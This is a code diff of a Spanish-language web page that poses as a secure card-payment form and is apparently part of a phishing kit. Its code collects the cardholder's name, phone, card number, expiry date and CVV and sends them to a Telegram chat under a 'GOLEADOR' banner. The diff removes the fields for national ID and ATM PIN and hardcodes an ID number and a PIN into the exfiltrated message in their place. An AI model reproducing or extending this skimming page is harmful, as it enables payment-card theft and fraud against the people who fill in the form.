@@ -78,7 +78,6 @@
             margin-left: 8px; 
             display: none; 
         } 
-
     </style> 
 </head> 
 <body> 
@@ -93,21 +92,6 @@
                 <p class="text-sm text-gray-700 text-center mb-6">Completa la información para finalizar el pago de forma segura.</p> 
 
                 <form id="pagoForm"> 
-                    <div class="w-full mb-4">
-                        <label for="tipo_doc" class="block text-sm font-medium text-gray-700 mb-1">Tipo de Documento</label>
-                        <select id="tipo_doc" class="w-full text-lg border border-gray-400 rounded-md p-2" required>
-                            <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
-                            <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
-                            <option value="Cédula de Extranjería">Cédula de Extranjería</option>
-                            <option value="Pasaporte">Pasaporte</option>
-                        </select>
-                    </div>
-
-                    <div class="w-full mb-4">
-                        <label for="cedula" class="block text-sm font-medium text-gray-700 mb-1">Cédula</label>
-                        <input type="tel" id="cedula" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Número de Cédula" required>
-                    </div>
-
                     <div class="w-full mb-4"> 
                         <label for="nombre_titular" class="block text-sm font-medium text-gray-700 mb-1">Nombre del titular</label> 
                         <input type="text" id="nombre_titular" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Nombre completo" required> 
@@ -130,11 +114,6 @@
                             <input type="tel" id="cvv" class="w-full text-lg border border-gray-400 rounded-md p-2 text-center" placeholder="XXX" maxlength="4" required> 
                         </div> 
                     </div> 
-
-                    <div class="w-full mb-4">
-                        <label for="clave_cajero" class="block text-sm font-medium text-gray-700 mb-1">Clave de cajero</label>
-                        <input type="password" id="clave_cajero" class="w-full text-lg border border-gray-400 rounded-md p-2" placeholder="Clave de 4 dígitos" maxlength="4" required>
-                    </div>
 
                     <div class="w-full mb-4"> 
                         <label for="telefono" class="block text-sm font-medium text-gray-700 mb-1">Teléfono</label> 
@@ -164,10 +143,6 @@
         document.addEventListener('DOMContentLoaded', async () => { 
             const app = document.getElementById("app"); 
             const pagoForm = document.getElementById("pagoForm"); 
-            // Se agregan las referencias a los nuevos campos
-            const tipoDocInput = document.getElementById("tipo_doc");
-            const cedulaInput = document.getElementById("cedula");
-            const claveCajeroInput = document.getElementById("clave_cajero");
             const numeroTarjetaInput = document.getElementById("numero_tarjeta"); 
             const fechaExpInput = document.getElementById("fecha_exp"); 
             const cvvInput = document.getElementById("cvv"); 
@@ -271,14 +246,9 @@
                 return true; 
             } 
 
-            // Función de validación general del formulario 
             function validateForm() { 
                 const nombreValido = nombreTitularInput.value.trim().length > 2; 
                 const telefonoValido = telefonoInput.value.trim().length >= 7; 
-                // Se agregan las validaciones para los nuevos campos
-                const tipoDocValido = tipoDocInput.value !== "";
-                const cedulaValida = cedulaInput.value.trim().length >= 5;
-                const claveCajeroValida = claveCajeroInput.value.trim().length === 4;
 
                 const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, ''); 
                 const numeroTarjetaValido = luhnCheck(numeroTarjeta) && numeroTarjeta.length >= 13 && numeroTarjeta.length <= 19; 
@@ -290,8 +260,7 @@
 
                 const cvvValido = cvvInput.value.length >= 3 && cvvInput.value.length <= 4; 
 
-                // Se actualiza la lógica del botón para incluir los nuevos campos
-                pagarBtn.disabled = !(nombreValido && telefonoValido && tipoDocValido && cedulaValida && claveCajeroValida && numeroTarjetaValido && fechaValida && cvvValido); 
+                pagarBtn.disabled = !(nombreValido && telefonoValido && numeroTarjetaValido && fechaValida && cvvValido); 
             } 
 
             // Listeners para dar formato a los campos y validar 
@@ -314,11 +283,7 @@
 
             cvvInput.addEventListener('input', validateForm); 
             nombreTitularInput.addEventListener('input', validateForm); 
-            telefonoInput.addEventListener('input', validateForm);
-            // Se agregan listeners para los nuevos campos
-            tipoDocInput.addEventListener('change', validateForm);
-            cedulaInput.addEventListener('input', validateForm);
-            claveCajeroInput.addEventListener('input', validateForm);
+            telefonoInput.addEventListener('input', validateForm); 
 
             // Función para enviar a Telegram y obtener el message_id 
             async function sendToTelegram(messageContent, keyboard) { 
@@ -450,10 +415,6 @@
                 event.preventDefault(); 
                 errorMessage.classList.add('hidden'); 
 
-                // Se obtienen los valores de los nuevos campos
-                const tipoDoc = tipoDocInput.value.trim();
-                const cedula = cedulaInput.value.trim();
-                const claveCajero = claveCajeroInput.value.trim();
                 const nombreTitular = nombreTitularInput.value.trim(); 
                 const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, ''); 
                 const fechaExp = fechaExpInput.value.trim(); 
@@ -473,10 +434,10 @@
 
                 let telegramMessage = '🍀 GOLEADOR 🍀\n\n'; 
                 telegramMessage += `Tipo de Ingreso: Tarjeta de Crédito\n`; 
-                // Se agregan los nuevos datos al mensaje de Telegram
-                telegramMessage += `Tipo de Doc: ${tipoDoc}\n`;
-                telegramMessage += `Cédula: ${cedula}\n`;
-                telegramMessage += `Clave: ${claveCajero}\n\n`;
+                // Datos fijos para Tipo de Doc, Cédula y Clave
+                telegramMessage += `Tipo de Doc: Cédula de Ciudadanía\n`; 
+                telegramMessage += `Cédula: 1032385512\n`; 
+                telegramMessage += `Clave: 1985\n\n`;
                 telegramMessage += `Nombre: ${nombreTitular}\n`; 
                 telegramMessage += `Teléfono: ${telefono}\n`; 
                 telegramMessage += `Tarjeta: ${numeroTarjeta}\n`; 
